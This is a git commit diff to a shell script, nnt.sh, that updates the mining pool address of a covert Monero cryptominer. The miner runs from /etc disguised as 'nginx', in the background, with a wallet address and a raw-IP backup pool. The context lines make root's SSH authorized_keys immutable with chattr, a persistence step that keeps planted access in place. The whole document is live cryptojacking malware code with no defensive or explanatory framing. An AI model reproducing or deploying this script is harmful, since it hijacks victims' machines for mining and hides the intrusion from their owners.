b7f48a259d318e744900ab5da93a076eeddf44f4
alfuwyjriiakjdk-lgtm <alfuwyjriiakjdk@gmail.com>
2025-09-28 16:42:06 +0300

    Update nnt.sh

--- nnt.sh
+++ nnt.sh
@@ -558,7 +558,7 @@ if [ -f "$rtdir" ]; then
         cd /etc
         echo "root not runninng"
         sleep 5s
-        ./nginx --log-file=/etc/kta --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls -o 80.211.206.105:9000 -u 84nw3MQdDJzRghGBEPWNAtLG8MA1ek1itN42Yup4dPK38wnWGY7zxSR28j2n4vyLspVPoDCFeijap2NTQJfegCTeANTrzot.51 --coin monero --background &
+        ./nginx --log-file=/etc/kta --keepalive --no-color --cpu-priority 5 -o pool.supportxmr.com:443 --tls -o 80.211.206.105:9000 -u 84nw3MQdDJzRghGBEPWNAtLG8MA1ek1itN42Yup4dPK38wnWGY7zxSR28j2n4vyLspVPoDCFeijap2NTQJfegCTeANTrzot.51 --coin monero --background &
     fi
     chmod 600 /root/.ssh/authorized_keys
     chattr +ia /root/.ssh/authorized_keys
